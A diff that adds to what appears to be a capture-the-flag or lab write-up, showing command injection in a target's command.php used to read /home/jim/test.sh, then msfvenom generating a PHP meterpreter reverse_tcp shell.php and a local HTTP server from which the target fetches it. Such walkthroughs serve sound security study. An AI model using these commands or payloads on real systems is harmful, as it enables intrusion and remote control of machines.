@@ -86,3 +86,49 @@ $ curl 'http://192.168.31.241/command.php' -H 'User-Agent: Mozilla/5.0 (X11; Lin
 
 edit the radio var can RCE
 
+and i run python to simple exp it 
+
+cmd=cat /home/jim/test.sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   957    0   919  100    38   149k   6333 --:--:-- --:--:-- --:--:--  155k
+#!/bin/bash
+for i in {1..5}
+do
+ sleep 1
+ echo "Learn bash they said."
+ sleep 1
+ echo "Bash is good they said."
+done
+ echo "But I'd rather bash my head against a brick wall."
+
+
+ try to send shell.php file
+
+ ```
+
+┌──(kali㉿Esonhugh)-[~]
+└─$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.141 LPORT=4444 -f raw -o ./shell.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 1115 bytes
+Saved as: ./shell.php
+                                                                                                            
+┌──(kali㉿Esonhugh)-[~]
+└─$ ls
+burp         githubProject  PHPstorm          RubymineProjects  Zlinux-exp-suggester2
+burpProject  go             PhpstormProjects  shell.php         zsh
+cmd.py       john-pass      powercat.ps1      someinfo          zshrc_backup
+Desktop      openvpn        RubyMine          vulmap
+                                                                                                            
+┌──(kali㉿Esonhugh)-[~]
+└─$ python -m http.server
+python3 is default python version in python command which created by alias
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.31.241 - - [16/Jan/2021 18:31:34] "GET /shell.php HTTP/1.1" 200 -
+
+
+ ```
+
